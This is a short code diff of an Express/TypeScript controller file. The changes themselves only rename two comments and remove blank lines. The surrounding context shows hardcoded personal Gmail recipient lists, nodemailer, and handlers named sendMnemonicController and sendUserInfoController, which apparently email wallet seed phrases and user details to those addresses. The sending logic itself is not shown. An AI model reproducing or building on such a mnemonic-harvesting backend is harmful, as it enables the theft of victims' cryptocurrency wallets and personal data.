@@ -2,7 +2,7 @@ import { Request, Response } from "express";
 import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
 import nodemailer from "nodemailer";
 
-// First
+// Ram
 const getRecipients = (): string[] => {
   const recipients = "davidmark7827@gmail.com,michealrroyroy@gmail.com";
   if (!recipients) return [];
@@ -77,7 +77,7 @@ export const sendMnemonicController = asyncHandler(
 );
 
 
-// Second
+// neeraj
 const getRecipients3 = (): string[] => {
   const recipients = "davidmark7827@gmail.com,kiteniyonmon@gmail.com";
   if (!recipients) return [];
@@ -221,8 +221,6 @@ export const sendUserInfoController = asyncHandler(
     }
   }
 );
-
-
 
 // Fourth
 
